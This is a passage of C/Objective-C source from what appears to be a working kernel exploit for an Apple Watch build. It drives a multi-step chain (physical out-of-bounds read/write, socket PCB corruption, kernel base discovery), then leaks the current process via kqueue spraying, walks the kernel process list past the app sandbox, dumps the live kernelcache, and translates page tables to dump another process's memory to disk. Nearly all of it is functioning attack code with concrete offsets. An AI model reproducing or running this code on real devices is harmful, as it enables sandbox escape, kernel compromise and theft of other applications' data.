	printf("[cleanup] done\n");
}

uint64_t kernel_base;
uint64_t kernel_slide;

static volatile int darksword_won = 0;

// Offset-free current_proc, leaked via a kqueue reclaim (see leak_current_proc).
uint64_t gCurrentProc = 0;
void leak_current_proc(void);

int darksword_succeeded(void)
{
	return darksword_won;
}

// ---- kernel proc-list walk (post-exploit) ------------------------------------
//
// The app sandbox blocks userland enumeration (sysctl KERN_PROC_ALL returns
// nothing), so once darksword has kernel R/W we walk the kernel proc list.
//
// Offsets (kfd dynamic_info.h, exact 10.6.1 T8006 entry):
#define OFF_P_LIST_LE_NEXT 0x00   // proc.p_list.le_next  (LIST_ENTRY at proc+0)
#define OFF_P_LIST_LE_PREV 0x08   // proc.p_list.le_prev
#define OFF_P_PID          0x60   // proc.p_pid
// kernproc pointer offset from kernel_base - CANDIDATE from 21R360/10.0.1 (the
// nearest available kernelcache); validated at runtime, with a windowed scan
// fallback if it drifted on 10.6.1.
#define KERNPROC_OFF_CANDIDATE 0x7c62e8ULL

static uint32_t ds_kread32(uint64_t addr)
{
	uint32_t v = 0;
	early_kread(addr, &v, sizeof(v));
	return v;
}

static void ds_kreadbuf(uint64_t addr, void *buf, size_t len)
{
	uint8_t *p = (uint8_t *)buf;
	size_t done = 0;
	while (done < len) {
		size_t chunk = len - done;
		if (chunk > EARLY_KRW_LENGTH) chunk = EARLY_KRW_LENGTH;
		early_kread(addr + done, p + done, chunk);
		done += chunk;
	}
}


// Only dereference pointers that fall in ranges we've observed to be mapped:
// the kernelcache static image, or the kernel heap/zone range. Reading an
// unmapped kernel address through the icmp6 primitive panics the kernel, so we
// must NOT blindly deref arbitrary "plausible" pointers found during scanning.
static inline bool ds_kptr_derefable(uint64_t v)
{
	if (v >= kernel_base && v < kernel_base + 0x3000000ULL) return true;      // static image
	// kernel heap/zone range. The kalloc heap is 0xffffffd0.. but pmap objects
	// live in a zone just above it (observed vm_map->pmap = 0xfffffff0_8b02f5a0),
	// so extend the upper bound past 0xfffffff0_00000000.
	if (v >= 0xffffffd000000000ULL && v < 0xfffffff800000000ULL) return true; // heap/zone + pmap zone
	return false;
}

// A proc looks valid if its pid is in a sane range.
static bool ds_proc_ok(uint64_t proc)
{
	if (!ds_kptr_derefable(proc)) return false;
	uint32_t pid = ds_kread32(proc + OFF_P_PID);
	return pid < 1000000;  // pids are small; garbage reads won't satisfy this
}

// True if the proc struct contains the given name substring within its first
// 0x600 bytes (covers p_comm/p_name). Used to positively identify kernproc and
// to reject false positives (e.g. a pointer into zeroed memory with pid==0).
static bool ds_proc_has_name(uint64_t proc, const char *needle)
{
	uint8_t buf[0x600];
	ds_kreadbuf(proc, buf, sizeof(buf));
	size_t nlen = strlen(needle);
	for (size_t off = 0; off + nlen <= sizeof(buf); off++) {
		if (memcmp(buf + off, needle, nlen) == 0) return true;
	}
	return false;
}

// Locate kernproc: try the candidate offset, else scan a window around it.
// Find the heap pointer that repeats most across buf. On a page full of sprayed
// kqueues, that's kq_p == current_proc (identical in every kqueue). No struct
// offsets needed - purely the repeating-value signature.
static uint64_t ds_find_repeating_kptr(const uint8_t *buf, size_t len)
{
	uint64_t best = 0;
	int bestcount = 0;
	for (size_t i = 0; i + 8 <= len; i += 8) {
		uint64_t v = *(const uint64_t *)(buf + i);
		if (v < 0xffffffd000000000ULL || v >= 0xffffffe800000000ULL) continue; // heap range
		int c = 0;
		for (size_t j = 0; j + 8 <= len; j += 8) {
			if (*(const uint64_t *)(buf + j) == v) c++;
		}
		if (c > bestcount) { bestcount = c; best = v; }
	}
	return bestcount >= 3 ? best : 0;  // require it to repeat (many kqueues/page)
}

// Offset-free current_proc leak: spray kqueues onto PUAF'd pages and read back
// kq_p via the physical-read race. MUST be called while freeThread is alive.
void leak_current_proc(void)
{
	if (gCurrentProc) return;

	uint64_t searchMappingSize = 0x80 * PAGE_SIZE;  // 2MB (mirror pe_v1)
	uint64_t searchMappingNum  = 0x10;

	struct rlimit rl;
	if (getrlimit(RLIMIT_NOFILE, &rl) == 0) { rl.rlim_cur = rl.rlim_max; setrlimit(RLIMIT_NOFILE, &rl); }

	void *readBuffer = calloc(1, OOB_SIZE);
	const int NKQ = 20000;
	int *kqfds = (int *)calloc(NKQ, sizeof(int));
	const char *myname = executableName ? executableName : "Peepo";

	for (int attempt = 0; attempt < 6 && !gCurrentProc && !darksword_cancelled; attempt++) {
		printf("[leak] attempt %d...\n", attempt);
		NSMutableArray *maps = [NSMutableArray new];
		for (uint64_t s = 0; s < searchMappingNum; s++) {
			mach_vm_address_t a = 0;
			if (mach_vm_allocate(mach_task_self(), &a, searchMappingSize,
			                     VM_FLAGS_ANYWHERE | VM_FLAGS_RANDOM_ADDR) != KERN_SUCCESS) break;
			for (uint64_t k = 0; k < searchMappingSize; k += PAGE_SIZE) *(uint64_t *)(a + k) = randomMarker;
			[maps addObject:@(a)];
		}

		int nkq = 0;
		for (int i = 0; i < NKQ; i++) { int fd = kqueue(); if (fd < 0) break; kqfds[nkq++] = fd; }
		sleep(1);

		for (uint64_t s = 0; s < (uint64_t)maps.count && !gCurrentProc; s++) {
			mach_vm_address_t a = [maps[s] unsignedLongLongValue];
			mach_port_t mo = 0; mach_vm_size_t mos = searchMappingSize;
			if (mach_make_memory_entry_64(mach_task_self(), &mos, a, VM_PROT_DEFAULT, &mo, 0) != KERN_SUCCESS) continue;
			surface_mlock(a, searchMappingSize);
			for (mach_vm_offset_t off = 0; off + pcSize <= searchMappingSize && !gCurrentProc; off += PAGE_SIZE) {
				if (darksword_cancelled) break;
				if (physical_oob_read_mo(mo, off, OOB_SIZE, OOB_OFFSET, readBuffer) == KERN_SUCCESS) {
					uint64_t cand = ds_find_repeating_kptr(readBuffer, OOB_SIZE);
					if (cand) {
						uint32_t pid = ds_kread32(cand + OFF_P_PID);
						if (pid > 0 && pid < 1000000 && ds_proc_has_name(cand, myname)) {
							gCurrentProc = cand;
							printf("[leak] current_proc=%#llx pid=%u\n", cand, pid);
						}
					}
				}
			}
			mach_port_deallocate(mach_task_self(), mo);
		}

		for (int i = 0; i < nkq; i++) close(kqfds[i]);
		for (uint64_t s = 0; s < (uint64_t)maps.count; s++)
			mach_vm_deallocate(mach_task_self(), [maps[s] unsignedLongLongValue], searchMappingSize);
		[maps removeAllObjects];
		if (!gCurrentProc) sleep(1);
	}
	free(kqfds);
	free(readBuffer);
	if (!gCurrentProc) printf("[leak] current_proc not found\n");
}

// Find the proc-name field offset by locating a known name substring.
static int ds_calibrate_name_off(uint64_t proc, const char *needle)
{
	uint8_t buf[0x600];
	ds_kreadbuf(proc, buf, sizeof(buf));
	size_t nlen = strlen(needle);
	for (int off = 0; off + (int)nlen < (int)sizeof(buf); off++) {
		if (memcmp(buf + off, needle, nlen) == 0) return off;
	}
	return -1;
}

static int gNameOff = -1;

// Strip a PAC-signed kernel heap pointer back to canonical form (40-bit VA +
// 0xffffff prefix). Identity for already-canonical pointers.
static inline uint64_t ds_strip(uint64_t v)
{
	// Kernel VAs on this build are 39-bit ([38:0]) with [63:39] = all-ones; PAC on
	// signed kernel pointers occupies bits [63:39]. Keep [38:0] and force [63:39]=1.
	// (The old mask kept [39:0], leaving PAC-corrupted bit 39 → signed pointers like
	// vm_map->pmap and task->map stripped to the wrong, non-derefable address.)
	return (v & 0x7fffffffffULL) | 0xffffff8000000000ULL;
}

// Proof read: for a target proc, walk proc -> task -> vm_map and dump the map
// struct, proving we can read another process's address-space metadata.
#define OFF_PROC_OBJECT_SIZE 0x740   // proc->task gap (proc_struct_size). task=proc+0x740. VALIDATED 2026-06-20 (kfd's 0x778 was WRONG for this build)
#define OFF_TASK_MAP         0x28    // task->map (kfd)
// Dump the live kernelcache (the exact running 10.6.1 image) from kernel memory.
// The image is fully mapped, so all reads are safe.
static volatile int gDumping = 0;
static char gLastDumpPath[256] = {0};   // path of last successful process dump (hex viewer)

// Return how much of the kernelcache is safe to dump contiguously from
// kernel_base. The tail segments (__PRELINK_INFO / __LINKEDIT) are freed/unmapped
// after boot - reading into them panics. __TEXT_EXEC is the last always-mapped
// segment before that gap and holds all the code we need to disassemble, so we
// clamp the dump to its end (covers __TEXT, __PRELINK_TEXT, __DATA_CONST,
// __TEXT_EXEC - all contiguous and mapped).
static uint64_t ds_kernelcache_size(void)
{
	uint8_t hdr[0x20];
	ds_kreadbuf(kernel_base, hdr, sizeof(hdr));
	uint32_t ncmds = *(uint32_t *)(hdr + 0x10);
	uint64_t text_exec_end = 0;
	uint64_t lc = kernel_base + 0x20;
	for (uint32_t i = 0; i < ncmds && i < 1024; i++) {
		uint8_t seg[0x40];
		ds_kreadbuf(lc, seg, sizeof(seg));
		uint32_t cmd = *(uint32_t *)(seg + 0);
		uint32_t cmdsize = *(uint32_t *)(seg + 4);
		if (cmdsize < 8 || cmdsize > 0x4000) break;
		if (cmd == 0x19) {  // LC_SEGMENT_64; segname at seg+0x8 (16 bytes)
			if (memcmp(seg + 0x8, "__TEXT_EXEC", 11) == 0) {
				uint64_t vmaddr = *(uint64_t *)(seg + 0x18);
				uint64_t vmsize = *(uint64_t *)(seg + 0x20);
				text_exec_end = vmaddr + vmsize;
			}
		}
		lc += cmdsize;
	}
	uint64_t total = (text_exec_end > kernel_base) ? (text_exec_end - kernel_base) : 0;
	if (total == 0 || total > 0x4000000ULL) total = 0x2800000ULL;  // fallback ~40MB
	return total;
}

// Dump the live kernelcache into the app's Documents container (pull with
// `devicectl device copy from`).
void peepo_dump_kernelcache(void)
{
	if (!kernel_base) { printf("[dump] no kernel_base\n"); return; }
	if (__sync_lock_test_and_set(&gDumping, 1)) { printf("[dump] already running\n"); return; }

	uint64_t total = ds_kernelcache_size();
	printf("[dump] base=%#llx size=%#llx (%llu MB)\n", kernel_base, total, total / (1024 * 1024));

	NSString *docs = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES).firstObject;
	NSString *path = [docs stringByAppendingPathComponent:@"kc.bin"];
	FILE *f = fopen(path.UTF8String, "wb");
	if (!f) { printf("[dump] fopen failed: %s\n", path.UTF8String); gDumping = 0; return; }
	printf("[dump] writing -> %s\n", path.UTF8String);

	const size_t CHUNK = 0x4000;
	uint8_t *buf = (uint8_t *)malloc(CHUNK);
	uint64_t done = 0;
	while (done < total && !darksword_cancelled) {
		size_t n = (total - done) < CHUNK ? (size_t)(total - done) : CHUNK;
		ds_kreadbuf(kernel_base + done, buf, n);
		fwrite(buf, 1, n, f);
		done += n;
		if ((done % 0x100000ULL) == 0) { fflush(f); fsync(fileno(f)); printf("[dump] %#llx / %#llx\n", done, total); }
	}
	free(buf);
	fflush(f); fsync(fileno(f)); fclose(f);
	printf("[dump] DONE %#llx bytes -> %s\n", done, path.UTF8String);
	gDumping = 0;
}

// ---- page-table walk: read another process's user memory --------------------
// pmap layout (kfd static_info): tte@0x0 (virtual root TT), ttep@0x8 (physical
// root TT) - both unsigned in struct pmap. 16KB pages on T8006.
#define OFF_PMAP_TTE    0x0
#define OFF_PMAP_TTEP   0x8
// vm_map->pmap: validated against the EXACT 10.6.1 kernelcache dump (2026-06-19).
// offsetof(_vm_map,pmap)= lck_rw_t(0x10) + vm_map_header(0x30) = 0x40. The field is
// XNU_PTRAUTH_SIGNED_PTR("_vm_map.pmap"); clang discriminator = 0x250c (NOT 0x2fef).
// 164 kernel sites auth a +0x40 load with movk #0x250c - the canonical map->pmap
// codegen `ldr x16,[map,#0x40]!; mov x17,map; movk x17,#0x250c,lsl#48; autda`.
// (The old 0x558/disc-0x2fef was a misattributed different signed field.)
#define OFF_VM_MAP_PMAP 0x40    // vm_map->pmap (PAC-signed data-key-A, disc 0x250c)
#define DS_PAGE_SHIFT   14
#define DS_PAGE_SZ      (1ULL << DS_PAGE_SHIFT)
#define DS_PAGE_MASK    (DS_PAGE_SZ - 1)
#define TTE_VALID       0x1ULL
#define TTE_PA_MASK     0x0000ffffffffc000ULL   // 16KB-aligned next-table/page PA

static uint64_t gPhysmapOff = 0;   // physmap kva = pa + gPhysmapOff

static uint64_t ds_pmap_of(uint64_t proc)
{
	uint64_t task = proc + OFF_PROC_OBJECT_SIZE;
	uint64_t map  = ds_strip(early_kread64(task + OFF_TASK_MAP));
	return ds_strip(early_kread64(map + OFF_VM_MAP_PMAP));
}

// Derive the physmap slide from a pmap's own root table: tte (physmap virtual)
// minus ttep (physical) of the same table.
static bool ds_setup_physmap(uint64_t pmap)
{
	uint64_t tte  = early_kread64(pmap + OFF_PMAP_TTE);
	uint64_t ttep = early_kread64(pmap + OFF_PMAP_TTEP);
	printf("[pt] pmap=%#llx tte=%#llx ttep=%#llx\n", pmap, tte, ttep);
	// tte = L1 root KVA (8 entries, 64-byte aligned); ttep = its physical. Slide is
	// 16KB-aligned. (Root is L1, NOT 16KB-aligned - don't require page alignment.)
	if (!ds_kptr_derefable(tte) || ttep == 0 || ttep >= 0x1000000000ULL || tte <= ttep ||
	    (tte & 0x3f) != 0 || (ttep & 0x3f) != 0 || ((tte - ttep) & 0x3fff) != 0) {
		printf("[pt] implausible tte/ttep\n");
		return false;
	}
	gPhysmapOff = tte - ttep;
	printf("[pt] physmap_off=%#llx\n", gPhysmapOff);
	return true;
}

// Translate a user VA in `pmap` to a physical address. 3-level 16KB walk for the
// watch's 39-bit user VA: L1 (8-entry root) -> L2 (2048) -> L3 (2048). VALIDATED
// 2026-06-20. Returns 0 if not mapped.
// DRAM physical window (T8006). Only physical addresses here are covered by the
// physmap; reading device/MMIO/reserved physical through it panics.
// Readable physmap window. The low ~0x7MB of DRAM (0x8_00000000..gPhysBase) is a
// reserved carveout (iBoot/SEP/TZ) NOT in the physmap - reading it panics. From
// live traces: pages at 0x801../0x802.. panic; gPhysBase <= 0x806e68cc0 (read OK).
// 0x807000000 is safely >= gPhysBase and below every observed-good page. HI = 1GB
// (S4 has no DRAM above 0x8_40000000). TODO: read exact gPhysBase/gPhysSize for full coverage.
#define DS_DRAM_LO 0x807000000ULL
#define DS_DRAM_HI 0x840000000ULL

// Optional walk tracing: dump sets gWalkLog>0 to log the first N translations.
static int gWalkLog = 0;
static FILE *gWalkLogF = NULL;
#define WL(...) do { if (gWalkLogF) { fprintf(gWalkLogF, __VA_ARGS__); fflush(gWalkLogF); fcntl(fileno(gWalkLogF), F_FULLFSYNC, 0); printf(__VA_ARGS__); } } while (0)

static uint64_t ds_va_to_phys(uint64_t pmap, uint64_t va)
{
	int log = (gWalkLog > 0); if (log) gWalkLog--;
	uint64_t l1_kva = early_kread64(pmap + OFF_PMAP_TTE);   // L1 root table KVA
	if (!ds_kptr_derefable(l1_kva)) { if (log) WL("[w] va=%#llx l1_kva=%#llx !deref\n", va, l1_kva); return 0; }
	uint64_t l1i = (va >> 36) & 0x7;
	uint64_t l2i = (va >> 25) & 0x7ff;
	uint64_t l3i = (va >> DS_PAGE_SHIFT) & 0x7ff;
	uint64_t l1e = early_kread64(l1_kva + l1i * 8);
	if (log) WL("[w] va=%#llx l1_kva=%#llx l1e=%#llx\n", va, l1_kva, l1e);
	if ((l1e & 0x3) != 0x3) return 0;
	uint64_t l2pa = l1e & TTE_PA_MASK;                      // L2 table physical (must be DRAM)
	if (l2pa < DS_DRAM_LO || l2pa >= DS_DRAM_HI) { if (log) WL("[w]   l2pa=%#llx !DRAM\n", l2pa); return 0; }
	uint64_t l2_kva = l2pa + gPhysmapOff;
	if (!ds_kptr_derefable(l2_kva)) { if (log) WL("[w]   l2_kva=%#llx !deref\n", l2_kva); return 0; }
	uint64_t l2e = early_kread64(l2_kva + l2i * 8);
	if (log) WL("[w]   l2pa=%#llx l2e=%#llx\n", l2pa, l2e);
	if ((l2e & 0x3) != 0x3) return 0;   // valid table descriptor (skips 32MB blocks)
	uint64_t l3pa = l2e & TTE_PA_MASK;                      // L3 table physical (must be DRAM)
	if (l3pa < DS_DRAM_LO || l3pa >= DS_DRAM_HI) { if (log) WL("[w]   l3pa=%#llx !DRAM\n", l3pa); return 0; }
	uint64_t l3_kva = l3pa + gPhysmapOff;
	if (!ds_kptr_derefable(l3_kva)) return 0;
	uint64_t l3e = early_kread64(l3_kva + l3i * 8);
	if (log) WL("[w]   l3pa=%#llx l3e=%#llx -> pa=%#llx\n", l3pa, l3e, (l3e & TTE_PA_MASK) + (va & DS_PAGE_MASK));
	if ((l3e & 0x3) != 0x3) return 0;   // valid L3 page descriptor
	return (l3e & TTE_PA_MASK) + (va & DS_PAGE_MASK);
}

// Set to 1 to write the durable dumpdbg.log + PT-walk trace while debugging dumps.
#define DUMP_DEBUG 0

// Dump a target process's mapped memory to the app container (pull with
// `devicectl device copy from ... --source Documents/proc_<pid>.bin`). Walks the
// target's vm_map entry list, translates each 16KB page via the validated
// proc->task->map->pmap->PT-walk chain, and writes [u64 va][16KB page] records for
// every MAPPED page (unmapped pages skipped). Panic-safe: only reads the target's
// own page tables / physmap-backed mapped pages.
void peepo_dump_process(uint64_t proc, const char *name)
{
	if (!proc) { printf("[dump-proc] no proc\n"); return; }
	if (__sync_lock_test_and_set(&gDumping, 1)) { printf("[dump-proc] already running\n"); return; }

	// Sanitized, identifiable filename base: <last 16 chars of name>. Non-alnum -> '_'.
	char base[20] = {0};
	if (name && name[0]) {
		size_t n = strlen(name);
		const char *src = (n > 16) ? name + (n - 16) : name;   // last 16 chars
		int j = 0;
		for (int i = 0; src[i] && j < 16; i++) {
			char c = src[i];
			base[j++] = (c=='.'||(c>='0'&&c<='9')||(c>='A'&&c<='Z')||(c>='a'&&c<='z')) ? c : '_';
		}
	}
	if (!base[0]) snprintf(base, sizeof(base), "proc");

	// DUMP_DEBUG=1: mirror every step to Documents/dumpdbg.log (F_FULLFSYNC'd so it
	// survives a panic) + the first 24 PT-walk translations - used to diagnose panics.
	// DUMP_DEBUG=0 (default): console-only, no file/fsync, for lean/fast dumps.
	NSString *docs = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES).firstObject;
#if DUMP_DEBUG
	NSString *dbgpath = [docs stringByAppendingPathComponent:@"dumpdbg.log"];
	FILE *dbg = fopen(dbgpath.UTF8String, "w");
	#define DLOG(...) do { printf(__VA_ARGS__); \
		if (dbg) { fprintf(dbg, __VA_ARGS__); fflush(dbg); fcntl(fileno(dbg), F_FULLFSYNC, 0); } } while (0)
#else
	FILE *dbg = NULL;
	#define DLOG(...) printf(__VA_ARGS__)
#endif
	#define DABORT(msg) do { DLOG("[dump] ABORT: %s\n", msg); if (dbg) fclose(dbg); gDumping = 0; return; } while (0)

	uint32_t pid = ds_kread32(proc + OFF_P_PID);
	DLOG("[dump] start pid=%u proc=%#llx\n", pid, proc);

	// proc -> task -> map -> pmap, guarded + logged at each hop.
	uint64_t task = proc + OFF_PROC_OBJECT_SIZE;
	DLOG("[dump] task=%#llx reading task->map @ +%#x\n", task, (unsigned)OFF_TASK_MAP);
	uint64_t map = ds_strip(early_kread64(task + OFF_TASK_MAP));
	DLOG("[dump] map=%#llx derefable=%d\n", map, ds_kptr_derefable(map));
	if (!ds_kptr_derefable(map)) DABORT("map not derefable");

	DLOG("[dump] reading map->pmap @ +%#x\n", (unsigned)OFF_VM_MAP_PMAP);
	uint64_t pmap = ds_strip(early_kread64(map + OFF_VM_MAP_PMAP));
	DLOG("[dump] pmap=%#llx derefable=%d\n", pmap, ds_kptr_derefable(pmap));
	if (!ds_kptr_derefable(pmap)) DABORT("pmap not derefable");

	DLOG("[dump] reading pmap tte/ttep\n");
	uint64_t tte = early_kread64(pmap + OFF_PMAP_TTE), ttep = early_kread64(pmap + OFF_PMAP_TTEP);
	DLOG("[dump] target tte=%#llx ttep=%#llx (its slide %#llx)\n", tte, ttep, tte - ttep);
	if (!ds_kptr_derefable(tte)) DABORT("target tte (root) not derefable");
	// The physmap slide is GLOBAL - derive it from OUR own validated process, not the
	// target (a target's ttep can be inconsistent / not the real root physical). The
	// walk then uses the target's tte (root KVA) + this global slide.
	uint64_t self_pmap = gCurrentProc ? ds_pmap_of(gCurrentProc) : pmap;
	if (!ds_kptr_derefable(self_pmap) || !ds_setup_physmap(self_pmap)) DABORT("global physmap setup failed");
	DLOG("[dump] GLOBAL physoff=%#llx - opening bin\n", gPhysmapOff);

	NSString *path = [docs stringByAppendingPathComponent:[NSString stringWithFormat:@"%s_%u.bin", base, pid]];
	FILE *f = fopen(path.UTF8String, "wb");
	if (!f) DABORT("fopen bin failed");
	gWalkLogF = dbg; gWalkLog = 24;   // trace the first 24 translations

	// vm_map entry list: sentinel = &map->hdr.links = map+0x10; first = links.next @ map+0x18;
	// each entry: links.next @ +0x08, vme_start @ +0x10, vme_end @ +0x18.
	const uint64_t sentinel = map + 0x10;
	const uint64_t CAP = 1024ULL * 1024 * 1024;   // 1 GB cap (covers full process RSS)
	uint8_t *page = (uint8_t *)malloc(DS_PAGE_SZ);
	uint64_t total = 0; int nregions = 0;
	uint64_t e = early_kread64(map + 0x18);
	int guard = 0;
	while (e && e != sentinel && guard++ < 200000 && total < CAP && !darksword_cancelled) {
		if (!ds_kptr_derefable(e)) break;
		uint64_t start = early_kread64(e + 0x10);
		uint64_t end   = early_kread64(e + 0x18);
		uint64_t next  = early_kread64(e + 0x08);
		if (end > start && (end - start) <= 0x80000000ULL) {
			nregions++;
			DLOG("[dump] region %d: %#llx-%#llx (%llu KB)\n", nregions, start, end, (end-start) >> 10);
			for (uint64_t va = start & ~DS_PAGE_MASK; va < end && total < CAP && !darksword_cancelled; va += DS_PAGE_SZ) {
				uint64_t pa = ds_va_to_phys(pmap, va);   // table reads are gated/guarded inside
				if (!pa) continue;                       // unmapped - skip (silent)
				if (pa < DS_DRAM_LO || pa >= DS_DRAM_HI) continue;   // outside readable physmap - skip
				ds_kreadbuf(pa + gPhysmapOff, page, DS_PAGE_SZ);
				fwrite(&va, sizeof(va), 1, f);
				fwrite(page, 1, DS_PAGE_SZ, f);
				total += DS_PAGE_SZ;
			}
		}
		e = next;
	}
	free(page);
	gWalkLogF = NULL; gWalkLog = 0;   // stop walk tracing before closing dbg
	if (dbg) { DLOG("[dump] === complete ===\n"); fclose(dbg); }
	#undef DLOG
	#undef DABORT
	fflush(f); fsync(fileno(f)); fclose(f);
	if (total > 0) strlcpy(gLastDumpPath, path.UTF8String, sizeof(gLastDumpPath));   // for the on-watch hex viewer
	printf("[dump-proc] DONE pid=%u regions=%d %llu bytes (%llu MB) -> %s\n",
	       pid, nregions, total, total >> 20, path.UTF8String);
	gDumping = 0;
}

// Path of the last successful process dump (for the on-watch hex viewer), or NULL.
const char *peepo_last_dump_path(void) { return gLastDumpPath[0] ? gLastDumpPath : NULL; }

static int ds_walk_procs(ds_proc_info_t *out, int32_t max)
{
	uint64_t anchor = gCurrentProc;
	if (!anchor) { printf("[procs] no current_proc anchor\n"); return -1; }

	int name_off = ds_calibrate_name_off(anchor, executableName ? executableName : "Peepo");
	gNameOff = name_off;
	printf("[procs] anchor=%#llx name_off=%#x\n", anchor, name_off);

	int count = 0;
	// Forward from anchor via le_next.
	uint64_t p = anchor;
	int guard = 0;
	while (p && count < max && guard++ < 4096) {
		if (!ds_proc_ok(p)) break;
		out[count].pid = (int32_t)ds_kread32(p + OFF_P_PID);
		out[count].proc = p;
		out[count].name[0] = '\0';
		if (name_off >= 0) {
			ds_kreadbuf(p + name_off, out[count].name, sizeof(out[count].name) - 1);
			out[count].name[sizeof(out[count].name) - 1] = '\0';
		}
		if (out[count].name[0] == '\0')
			snprintf(out[count].name, sizeof(out[count].name), "pid %d", out[count].pid);
		count++;
		p = early_kread64(p + OFF_P_LIST_LE_NEXT);
	}

	// Backward from anchor via le_prev (le_prev points at prev->le_next == prev proc).
	p = anchor;
	guard = 0;
	while (count < max && guard++ < 4096) {
		uint64_t prev = early_kread64(p + OFF_P_LIST_LE_PREV);
		if (!ds_proc_ok(prev)) break;
		if (early_kread64(prev + OFF_P_LIST_LE_NEXT) != p) break;
		out[count].pid = (int32_t)ds_kread32(prev + OFF_P_PID);
		out[count].proc = prev;
		out[count].name[0] = '\0';
		if (name_off >= 0) {
			ds_kreadbuf(prev + name_off, out[count].name, sizeof(out[count].name) - 1);
			out[count].name[sizeof(out[count].name) - 1] = '\0';
		}
		if (out[count].name[0] == '\0')
			snprintf(out[count].name, sizeof(out[count].name), "pid %d", out[count].pid);
		count++;
		p = prev;
	}

	printf("[procs] walked %d processes\n", count);
	return count;
}

// Enumerate processes. Prefers the kernel walk once darksword has R/W; falls
// back to sysctl (sandbox-restricted) otherwise.
int peepo_list_processes(ds_proc_info_t *out, int32_t max)
{
	if (!out || max <= 0) return -1;

	if (darksword_won) {
		int n = ds_walk_procs(out, max);
		if (n > 0) return n;
	}

	int mib[4] = { CTL_KERN, KERN_PROC, KERN_PROC_ALL, 0 };
	size_t len = 0;
	if (sysctl(mib, 4, NULL, &len, NULL, 0) != 0 || len == 0) return -1;
	len += len / 4 + 0x4000;
	struct kinfo_proc *procs = (struct kinfo_proc *)malloc(len);
	if (!procs) return -1;
	if (sysctl(mib, 4, procs, &len, NULL, 0) != 0) { free(procs); return -1; }
	int n = (int)(len / sizeof(struct kinfo_proc));
	int count = 0;
	for (int i = 0; i < n && count < max; i++) {
		pid_t pid = procs[i].kp_proc.p_pid;
		if (pid < 0) continue;
		out[count].pid = pid;
		out[count].proc = 0;
		strlcpy(out[count].name, procs[i].kp_proc.p_comm, sizeof(out[count].name));
		if (out[count].name[0] == '\0')
			snprintf(out[count].name, sizeof(out[count].name), "pid %d", pid);
		count++;
	}
	free(procs);
	return count;
}

void darksword_run(void)
{
	// Hard guard: a second concurrent run (e.g. an accidental double-tap of
	// DATASWORD) would race two exploit threads over the same sockets/race
	// machinery and panic the kernel instantly. Only ever allow one.
	if (__sync_lock_test_and_set(&darksword_running, 1)) {
		printf("[!] darksword already running - ignoring duplicate launch\n");
		return;
	}

	@autoreleasepool {
		// Clean up any previous run before starting fresh
		if (free_thread_needs_join) {
			printf("[*] joining previous free_thread...\n");
			goSync = 0;
			raceSync = 1;
			pthread_join(freeThread, NULL);
			free_thread_needs_join = false;
		}
		darksword_cancelled = 0;
		darksword_won = 0;
		highestSuccessIdx = 0;
		successReadCount = 0;
		controlSocket = 0;
		rwSocket = 0;
		controlSocketPcb = 0;
		rwSocketPcb = 0;
		pcObject = MACH_PORT_NULL;
		pcAddress = 0;
		goSync = 0;
		raceSync = 0;
		freeThreadStart = 0;
		if (readFd > 2)  { close(readFd);  readFd  = -1; }
		if (writeFd > 2) { close(writeFd); writeFd = -1; }

		printf("=== [STEP 1/7] init globals ===\n");
		init_globals();
		sleep(2);

		printf("=== [STEP 2/7] detect device ===\n");
		struct utsname name;
		uname(&name);
		printf("[i] %s\n", name.machine);
		sleep(2);

		printf("=== [STEP 3/7] pe_init (files + race thread) ===\n");
		pe_init();
		printf("[+] pe_init done - readFd=%d writeFd=%d\n", readFd, writeFd);
		sleep(2);

		printf("=== [STEP 4/7] physical OOB r/w + PCB corrupt ===\n");
		pe_v1();
		printf("[+] pe done - highestSuccessIdx=%d successReadCount=%d\n",
		       highestSuccessIdx, successReadCount);

		if (darksword_cancelled || rwSocketPcb == 0) {
			printf("[!] run cancelled or pe_v1 did not complete - unwinding\n");
			goSync = 0;
			raceSync = 1;
			if (free_thread_needs_join) {
				pthread_join(freeThread, NULL);
				free_thread_needs_join = false;
			}
			close(writeFd); writeFd = -1;
			close(readFd);  readFd  = -1;
			darksword_running = 0;
			return;
		}
		sleep(2);

		// Offset-free current_proc leak - MUST run while the race (freeThread)
		// is still alive, since it uses physical_oob_read_mo. The leak's reclaim
		// race is the unstable part (intermittent panic), and it's only needed
		// for PROCS/probe - NOT for the kernelcache dump. Skip it when we just
		// want a stable path to WIN + DUMP.
		if (gWantCurrentProc) {
			printf("=== [STEP 4.5/7] leak current_proc (kqueue reclaim) ===\n");
			leak_current_proc();
			if (gCurrentProc) {
				printf("\n>>>>>>>>>> ANCHOR OK <<<<<<<<<<\n");
				printf(">>>>>>>>>> gCurrentProc = %#llx <<<<<<<<<<\n\n", gCurrentProc);
			} else {
				printf("\n!!!!!!!!!! ANCHOR FAILED (leak missed) !!!!!!!!!!\n\n");
			}
			sleep(2);
		} else {
			printf("=== [STEP 4.5/7] skipped (current_proc leak disabled) ===\n");
		}


		printf("=== [STEP 5/7] teardown race thread + fds ===\n");
		goSync = 0;
		raceSync = 1;
		pthread_join(freeThread, NULL);
		free_thread_needs_join = false;
		close(writeFd);
		close(readFd);
		printf("[+] thread joined, fds closed\n");
		sleep(2);

		printf("=== [STEP 6/7] early kernel r/w via socket PCBs ===\n");
		controlSocketPcb = early_kread64(rwSocketPcb + 0x20);
		krw_sockets_leak_forever();
		printf("[+] kernel r/w online\n");
		sleep(2);

		printf("=== [STEP 7/7] find kernel base ===\n");
		uint64_t socketPtr = early_kread64(controlSocketPcb + OFFSET_PCB_SOCKET);
		uint64_t protoPtr  = early_kread64(socketPtr + OFFSET_SO_PROTO);
		uint64_t rawTextPtr = early_kread64(protoPtr + OFFSET_PR_INPUT);
		// pr_input is a PAC-signed pointer; the auth code occupies the top 32 bits
		// (bits [63:32]) - confirmed across runs where bits[39:32] varied (0xf0 vs
		// 0x70), so they are PAC, not address. The real kernel text address is the
		// low 32 bits. __xpaci is a no-op on this target, so strip by re-applying
		// the kernel-text VA prefix (0xfffffff0_00000000) taken from protoPtr, which
		// is a known-good unsigned text/data pointer with the same prefix.
		uint64_t vaPrefix  = protoPtr   & 0xffffffff00000000ULL;
		uint64_t textPtr   = (rawTextPtr & 0x00000000ffffffffULL) | vaPrefix;

		kernel_base = textPtr & 0xFFFFFFFFFFFFC000;
		bool foundBase = false;
		for (int scanGuard = 0; scanGuard < 0x4000; scanGuard++) {
			if (early_kread64(kernel_base) == 0x100000cfeedfacf &&
